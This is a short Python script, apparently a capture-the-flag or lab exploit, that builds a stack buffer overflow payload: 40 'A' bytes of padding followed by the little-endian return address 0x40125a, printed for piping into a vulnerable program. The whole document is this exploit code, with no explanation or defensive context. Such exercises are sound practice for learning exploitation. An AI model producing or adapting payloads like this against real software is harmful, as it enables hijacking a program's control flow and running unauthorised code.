direccion = 0x40125a
dir_bytes = direccion.to_bytes(8, byteorder="little")
dir_texto = dir_bytes.decode('latin-1')
payload = "A"*40 + dir_texto
print(payload)
